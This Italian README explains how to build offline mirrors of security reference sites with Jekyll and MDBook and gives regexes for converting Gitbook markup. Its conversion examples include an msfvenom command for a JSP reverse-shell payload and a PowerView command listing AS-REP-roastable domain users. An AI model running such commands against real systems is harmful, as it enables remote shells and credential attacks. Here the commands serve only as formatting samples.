# Airgaped Hacker Tools

## Jekyll

### Elenco siti

- gtfobins.github.io
- lolbas-project.github.io
- wadcoms.github.io

### Comandi utili

```bash
# Installa le dipendenze
bundle install

# Genera il sito
bundle exec jekyll build

# Avvia il server locale
bundle exec jekyll serve

# Genera il sito e lo serve
bundle exec jekyll serve --livereload
```

## MDBook

### Tema custom

Creare un tema custom con il comando:

```bash
mkdir -p EasiestSoft.com/tmp
cd EasiestSoft.com/tmp
mdbook init --theme

tree.com //F

│   book.toml
│
├───book
└───src
    │   chapter_1.md
    │   SUMMARY.md
    │
    └───theme
        │   book.js
        │   favicon.png
        │   highlight.css
        │   highlight.js
        │   index.hbs
        │
        └───css
                chrome.css
                general.css
                print.css
                variables.css    

mv src/theme path/to/your/book/root/mytheme
cd ..
rm -rf tmp
```

Aggimungere il tema custom al file `book.toml`:

```toml
[output.html]
theme = "mytheme"
```

Aggiungere eventuale css o js custom, dopo aver creato nella root le cartelle `css` e `js`, al file index.hbs:

```html
[...]
<link rel="stylesheet" href="css/custom.css">
[...]
<script src="js/custom.js"></script>
[...]
```


### Modifiche
Alcuni siti non sono stati progettati con MDBook ma ad esempio con Gitbook.
Per convertirli in MDBook è necessario:

#### CONTENT-REF

- Regex per individuare gli `content-ref` e modificare come da esempio:

    ```markdown
    {% content-ref url="generic-methodologies-and-resources/pentesting-methodology.md" %}
    pentesting-methodology.md
    {% endcontent-ref %}
    ```

    in

    ```markdown
    [pentesting-methodology.md](generic-methodologies-and-resources/pentesting-methodology.md)
    ```

    Regex per la ricerca tramite VSCode

    ```
    \{%[\s]*content-ref[\s]+url="([^"]+)"[\s]*%\}[\s]*([^\{]+)[\s]*\{%[\s]*endcontent-ref[\s]*%\}
    ``` 

    E stringa per la sostituzione
    ```
    [$1]($2)
    ```

    Poi modifica l'estensione `.md`:
    ```
    \[(.+?)\.md\]\((.+?)\/(.+?)\.md\) -> [$1]($2/$3.md)
    ```

#### CODE OVERFLOW
- Regex per individuare gli `code overflow` e modificare come da esempio:

    ```
    {% code overflow="wrap" %}
        ```bash
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
        ```
    {% endcode %}
    ```

    in

    ```markdown
        ```bash
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
        ```
    ```

    Regex vsc:
    ```
    \{%[\s]*code[\s]+overflow="wrap"[\s]*%\}\n([\s\S]*?)\n\{%[\s]*endcode[\s]*%\}
    ```

    E stringa per la sostituzione
    ```
    $1
    ```

#### CODE TITLE
- Regex per individuare gli `code title` e modificare come da esempio:

    ```
        {% code title="Using Windows" %}
            ```bash
            Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
            ```
        {% endcode %}
    ```

    in

    ```
        `Using Windows`
        ```bash
        Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
        ```
    ```

    Regex vsc:
    ```
    \{%[\s]*code[\s]+title="([^"]+)"[\s]*%\}\n([\s\S]*?)\n\{%[\s]*endcode[\s]*%\}
    ```

    E stringa per la sostituzione
    ```
    `$1`
    $2
    ```

#### EMBEDED

- Regex per individuare gli `embeded` e modificare come da esempio:

    ```markdown
    {% embed url="https://lolbas-project.github.io" %}
    ```

    in

    ```html
    <a href="https://lolbas-project.github.io" class="embed-url">https://lolbas-project.github.io</a>
    ```

    Regex per la ricerca tramite VSCode

    ```
    \{%\s*embed\s+url="([^"]+)"\s*%\}
    ``` 

    E stringa per la sostituzione
    ```
    <a href="$1" class="embed-url">$1</a>
    ```

#### PAGE-REF
- Regex per individuare gli `page-ref` e modificare come da esempio:

    ```markdown
    {% page-ref page="browser-artifacts.md" %}
    ```

    in

    ```markdown
    <a href="browser-artifacts.md" class="page-ref">browser-artifacts.md</a>
    ```

    Regex per la ricerca tramite VSCode

    ```
    \{%[\s]*page-ref[\s]+page="([^"]+)"[\s]*%\}
    ``` 

    E stringa per la sostituzione
    ```
    <a href="$1" class="page-ref">$1</a>
    ```

#### HINT

- Regex per individuare gli `hint` e modificare come da esempio:

    ```markdown
    {% hint style='info' %}
    **Info message**
    Lorem ipsum dolor sit amet, consectetur adipiscing elit.
    In hac habitasse platea dictumst.
    {% endhint %}
    ```

    in

    ```markdown
    <div class='notice notice-info'>
    <b>INFO</b></br>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit.
    In hac habitasse platea dictumst.
    </div>
    ```

    Regex per la ricerca tramite VSCode

    ```
    \{%[\s]*hint[\s]+style="([^"]+)"[\s]*%\}[\s]*([\s\S]*?)[\s]*\{%[\s]*endhint[\s]*%\}
    ```

    E stringa per la sostituzione

    ```
    <div class='notice notice-$1'><b>\U$1</b></br>
    $2
    </div>\n
    ```

    Aggiungere il seguente css a `css/general.css`

    ```css
    /* ========== */

    .notice {
        border-radius: 0 5px 5px 0;
        padding: 10px 10px;
        color: #434242;
    }

    .notice.notice-danger {
        border-left: 15px solid #f00;
        background-color: rgb(254, 138, 138);
    }

    .notice.notice-warning {
        border-left: 15px solid #ff0;
        background-color: rgb(255, 255, 141);
    }

    .notice.notice-info {
        border-left: 15px solid #00f;
        background-color: rgb(159, 210, 255);
    }

    .notice.notice-success {
        border-left: 15px solid #00cd41;
        background-color: rgb(155, 255, 155);
    }
    ```

### Bold

- Regex per individuare i `bold` e modificare come da esempio:

    ```markdown
    **bold**
    ```

    in

    ```html
    <b>bold</b>
    ```

    Regex per la ricerca tramite VSCode

    ```
    \*\*(.*?)\*\*
    ```

    E stringa per la sostituzione

    ```
    <b>$1</b>
    ```

    Successivamente, per ripristinare il grassetto del link:
    
    ```
    \[\s*<b>(.*?)<\/b>\s*\]\((.*?)\)
    ```

    E stringa per la sostituzione

    ```
    [$1]($2)
    ```

### Comandi utili

```bash
# Genera il libro
mdbook build

# Genera il libro e lo serve
mdbook serve
```

## Verifica dei file

Aprire un webserver con Python nella cartella del progetto:

```bash
python3 -m http.server
```